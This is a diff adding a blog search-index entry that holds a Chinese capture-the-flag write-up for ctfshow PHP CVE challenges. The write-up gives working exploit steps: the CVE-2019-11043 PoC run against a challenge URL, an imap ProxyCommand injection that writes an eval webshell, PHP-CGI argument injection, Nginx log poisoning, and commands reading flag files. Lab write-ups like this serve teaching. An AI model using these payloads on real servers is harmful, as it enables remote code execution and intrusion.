@@ -4,6 +4,45 @@
   
     
     <entry>
+      <title>Web入门_phpCVE</title>
+      <link href="/posts/ctfshow-webbasic-phpcve/"/>
+      <url>/posts/ctfshow-webbasic-phpcve/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>phpCVE</h1><hr><blockquote><p>搜索一般都是 <code>php/版本号 cve</code>或<code>php/版本号 漏洞</code></p></blockquote><h2 id="web311"><a class="header-anchor" href="#web311">¶</a>web311</h2><ul><li>描述: 似曾相识,就这一个文件，不用扫描</li></ul><p>抓包发现提示CVE, 以及<code>X-Powered-By: PHP/7.1.33dev</code></p><p>网上搜索, 对应的CVE为<code>CVE-2019-11043</code>, 再寻找可利用的poc</p><p><a href="https://blog.exsvc.cn/article/php-cve-2019-11043.html">参考1</a>, <a href="https://github.com/neex/phuip-fpizdam">github_poc</a></p><blockquote><p>我找到的poc好多都是基于这个写的, 这个poc需要安装go环境</p><p>他甚至给了你一个pdf详细解释这个漏洞</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt install golang</span><br><span class="line"><span class="comment"># yum install golang -y</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/neex/phuip-fpizdam.git</span><br><span class="line"><span class="built_in">cd</span> phuip-fpizdam</span><br><span class="line"><span class="comment"># 国内直接用这个exp可能会无法编译通过，需要先将代理设置为国内代理</span></span><br><span class="line">go <span class="built_in">env</span> -w GOPROXY=https://goproxy.cn</span><br><span class="line">go get -v &amp;&amp; go build</span><br><span class="line"><span class="comment"># 编译完成后执行，注意地址后必须加 index.php</span></span><br><span class="line">go run . <span class="string">&quot;https://23072827-c4c4-4285-ace5-7cce969a1d98.challenge.ctf.show/index.php&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20241010164353411.png" alt="image-20241010164353411"></p><p>在URL后加上<code>/index.php/?a=ls</code> 多请求几次, 不是每次都能成功:</p><p>可以得到当前目录下<code>fl0gHe1e.txt</code>, 修改为<code>/index.php/?a=cat%20fl0gHe1e.txt</code>即可</p><h2 id="web312"><a class="header-anchor" href="#web312">¶</a>web312</h2><ul><li>描述: 你懂的</li></ul><p>抓包得到返回包提示<code>X-Powered-By: PHP/5.6.38</code></p><p>利用该关键词搜索漏洞, 得到: PHP imap远程命令执行漏洞(<code>CVE-2018-19518</code>)</p><p><a href="https://github.com/vulhub/vulhub/tree/master/php/CVE-2018-19518">github_漏洞介绍</a>, 结合这个就可以轻松拿到shell</p><p>生成payload:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>= <span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="string">&quot;echo <span class="subst">$a</span> | base64 -d &gt;/var/www/html/1.php&quot;</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment"># x+-oProxyCommand%3decho%09ZWNobyBQRDl3YUhBZ1FHVjJZV3dvSkY5UVQxTlVXekZkS1RzL1BnPT0gfCBiYXNlNjQgLWQgPi92YXIvd3d3L2h0bWwvMS5waHA=|base64%09-d|sh&#125;</span></span><br></pre></td></tr></table></figure><p>利用payload即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1=system(&#x27;tac ctfshowfl4g&#x27;);</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20241010172405280.png" alt="image-20241010172405280"></p><h2 id="web313"><a class="header-anchor" href="#web313">¶</a>web313</h2><ul><li>描述: 你懂的</li></ul><p>抓包得到返回包提示<code>X-Powered-By: PHP/5.4.1</code></p><p>搜索得到 PHP-CGI远程代码执行<code>CVE-2012-1823</code>, 测试一下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-c 指定php.ini文件的位置</span><br><span class="line">-n 不要加载php.ini文件</span><br><span class="line">-d 指定配置项</span><br><span class="line">-b 启动fastcgi进程</span><br><span class="line">-s 显示文件源码</span><br><span class="line">-T 执行指定次该文件</span><br><span class="line">-h和-？ 显示帮助</span><br></pre></td></tr></table></figure><p>访问<code>/?-s</code>, 发现确实返回了源码</p><p>可以利用远程包含一个木马文件, 这里尝试写个马</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># GET:</span><br><span class="line">/index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input</span><br><span class="line"># 直接写在下面</span><br><span class="line">&lt;?php file_put_contents(&quot;1.php&quot;,&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;);?&gt;</span><br></pre></td></tr></table></figure><p>结果 Permission denied in php://input, 拉倒了</p><p>那就直接执行命令试试, 发现是可以执行的</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;ls&quot;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20241010181453690.png" alt="image-20241010181453690"></p><p>那就找flag, 最后在<code>/somewhere/fla9.txt</code>中找到, POC:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat /somewhere/fla9.txt&quot;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="web314"><a class="header-anchor" href="#web314">¶</a>web314</h2><ul><li>描述: 严格说算不上cve</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//phpinfo</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\:/&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>提示phpinfo, 访问<code>phpinfo.php</code>, 发现可以包含</p><p>过滤冒号, 那就用剩下的包含方式: 日志包含, 利用session.upload_progress文件包含</p><p>就用日志包含了:</p><p>wappalyzer查看架构, 发现是Nginx服务器, 默认日志文件为<code>/var/log/nginx/access.log</code>, 尝试访问<code>/?f=/var/log/nginx/access.log</code>, 发现是可以访问的</p><p>在UA头中写入一句话木马, 然后交给蚁剑</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>])<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20241010182803263.png" alt="image-20241010182803263"></p><p>最后在根目录下的fl6g得到flag</p><p>所以也可以直接POST传入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1=system(&#x27;cat /fl6g&#x27;);</span><br></pre></td></tr></table></figure><h2 id="web315"><a class="header-anchor" href="#web315">¶</a>web315</h2><ul><li>描述: debug开启，端口9000</li></ul><p><a href="https://github.com/vulhub/vulhub/tree/master/php/xdebug-rce">github_漏洞介绍</a></p><p>那就是纯纯的脚本小子, 这里面也有相关使用方法, 我不多赘述</p><p>再贴一个看不太懂的文章: <a href="https://blog.csdn.net/weixin_33277215/article/details/116468944">https://blog.csdn.net/weixin_33277215/article/details/116468944</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> ctfshow靶场 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 绕过 </tag>
+            
+            <tag> PHP </tag>
+            
+            <tag> RCE </tag>
+            
+            <tag> 文件包含 </tag>
+            
+            <tag> PHP伪协议 </tag>
+            
+            <tag> CVE </tag>
+            
+            <tag> CGI </tag>
+            
+            <tag> debug </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Web入门_代码审计</title>
       <link href="/posts/ctfshow-webbasic-codeaudit/"/>
       <url>/posts/ctfshow-webbasic-codeaudit/</url>
